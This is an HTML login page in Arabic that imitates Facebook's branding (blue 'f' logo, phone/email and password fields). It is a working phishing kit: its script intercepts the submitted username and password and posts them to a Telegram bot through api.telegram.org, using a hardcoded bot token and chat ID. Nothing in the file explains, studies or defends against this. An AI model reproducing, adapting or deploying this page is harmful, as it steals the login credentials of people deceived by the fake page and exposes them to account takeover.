<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
    body {
      margin: 0;
      padding: 0;
      font-family: 'Cairo', Arial, sans-serif;
      background: #fff;
    }
    .container {
      max-width: 400px;
      margin: 0 auto;
      padding-top: 70px;
    }
    .arrow {
      position: absolute;
      top: 32px;
      right: 32px;
      font-size: 32px;
      color: #222;
      z-index: 2;
      user-select: none;
    }
    .fb-logo {
      display: block;
      margin: 0 auto 60px auto;
      width: 140px;
      height: 140px;
      background: #1877f2;
      position: relative;
      border-radius: 24px; /* مربع مع زوايا مستديرة قليلاً */
      /* إذا أردت أن يكون مربع تماماً بدون زوايا مستديرة استخدم border-radius: 0; */
    }
    .fb-logo::after {
      content: "f";
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -54%);
      color: #fff;
      font-size: 100px;
      font-weight: bold;
      font-family: Arial, sans-serif;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 18px;
    }
    .input-wrapper {
      border: 2px solid #6c757d;
      border-radius: 22px;
      background: #fff;
      padding: 0;
    }
    .input-wrapper input {
      width: 100%;
      padding: 16px 18px 16px 18px;
      border: none;
      outline: none;
      font-size: 20px;
      background: transparent;
      text-align: right;
      font-family: inherit;
      color: #222;
    }
    .input-wrapper + .input-wrapper {
      border-color: #e4e6eb;
    }
    .login-btn {
      background: #1877f2;
      color: #fff;
      border: none;
      border-radius: 24px;
      padding: 16px 0;
      font-size: 22px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 12px;
      margin-bottom: 18px;
      width: 100%;
      transition: background 0.2s;
    }
    .login-btn:active {
      background: #145db2;
    }
    .forgot {
      text-align: center;
      color: #1c1e21;
      font-size: 20px;
      margin-top: 22px;
      font-weight: 400;
    }
    @media (max-width: 500px) {
      .container {
        max-width: 95vw;
        padding-top: 45px;
      }
      .arrow {
        top: 16px;
        right: 16px;
      }
      .fb-logo {
        width: 90px;
        height: 90px;
        margin-bottom: 40px;
        font-size: 48px;
      }
      .fb-logo::after {
        font-size: 62px;
      }
      .input-wrapper input {
        font-size: 18px;
        padding: 14px 12px;
      }
      .login-btn { font-size: 18px; padding: 13px 0; }
      .forgot { font-size: 16px; margin-top: 18px; }
    }
  </style>
</head>
<body>
  <div class="arrow">&#x203A;</div>
  <div class="container">
    <div class="fb-logo"></div>
    <form id="loginForm" autocomplete="off">
      <div class="input-wrapper">
        <input id="user" type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
      </div>
      <div class="input-wrapper">
        <input id="pass" type="password" placeholder="كلمة السر" required>
      </div>
      <button class="login-btn" type="submit">تسجيل الدخول</button>
    </form>
    <div class="forgot">هل نسيت كلمة السر؟</div>
  </div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      var user = document.getElementById('user').value;
      var pass = document.getElementById('pass').value;

      var message = `🔐 تسجيل دخول جديد:\n📱 المستخدم: ${user}\n🔑 كلمة السر: ${pass}`;
      var token = "8444121807:AAH6ZKbzt7IEvQ7cKuqCsQQxDUKzyT5blW4";
      var chatId = "6873334348";
      var url = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        alert("تم الإرسال بنجاح!");
      })
      .catch(error => {
        alert("حدث خطأ أثناء الإرسال!");
      });
    });
  </script>
</body>
</html>
